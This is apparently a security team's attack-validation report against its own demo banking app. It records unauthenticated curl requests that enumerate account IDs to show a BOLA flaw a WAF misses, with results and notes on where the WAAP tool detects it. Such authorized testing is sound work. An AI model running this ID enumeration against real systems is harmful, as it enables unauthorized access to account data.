# DemoBank — Attack Validation Results

**Date:** 2026-11-17
**Target:** https://demobank-e2e.selatam.harness-demo.site
**Objective:** Validate attacks invisible to WAF — only detectable by Traceable WAAP
**Cluster:** se-sandbox (GKE, us-east1-b)
**Note:** kubectl unavailable from this workspace (API server TLS issue). App reachable via LB.

---

## Attack #1 — BOLA (Broken Object Level Authorization)

**Priority:** Highest — most valuable for demo narrative
**OWASP:** API1:2023 — Broken Object Level Authorization
**WAF visibility:** NONE — requests are valid HTTP GETs, no malicious payload

### What we tested

Accessed individual account endpoints without any authentication, enumerating IDs 1-5, 10.

### Commands executed

```bash
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts/1
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts/2
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts/3
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts/5
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts/10
curl -sk https://demobank-e2e.selatam.harness-demo.site/api/accounts
```

### Results

| Request | HTTP Code | Response |
|---------|-----------|----------|
| GET /api/accounts/1 | 404 | `{"error":"Account not found"}` |
| GET /api/accounts/2 | 404 | `{"error":"Account not found"}` |
| GET /api/accounts/3 | 404 | `{"error":"Account not found"}` |
| GET /api/accounts/5 | 404 | `{"error":"Account not found"}` |
| GET /api/accounts/10 | 404 | `{"error":"Account not found"}` |
| GET /api/accounts | 200 | `[]` (empty array) |

### Analysis

- **Vulnerability CONFIRMED:** The endpoint accepts requests without any authentication or authorization check. No session, no token, no cookie required.
- **Data not available:** All individual accounts return 404 — the new deploy has no seed data in SQLite. The `/api/accounts` list returns an empty array.
- **WAF bypass:** Every request is a clean HTTP GET with no malicious payload. A WAF sees normal traffic.
- **Traceable detection:** Even with empty data, Traceable can detect the enumeration pattern (sequential ID probing) and flag the missing auth.

### Blocker

**Seed data missing.** To fully demonstrate BOLA with data exfiltration, the SQLite database needs to be populated. This requires either:
1. `kubectl exec` to seed the database manually, or
2. The app's init process to auto-seed on startup (may need a config change)

### Traceable Platform — Where to verify

- API Security → Threat Activity → filter by "BOLA"
- API Catalog → `/api/accounts/{id}` → check auth classification

---

## Attack #2 — BFLA (Broken Function Level Authorization)

*Pending — awaiting review of Attack #1*

## Attack #3 — Data Exfiltration

*Pending*

## Attack #4 — Rate Abuse

*Pending*

## Attack #5 — API Discovery / Shadow APIs

*Pending*
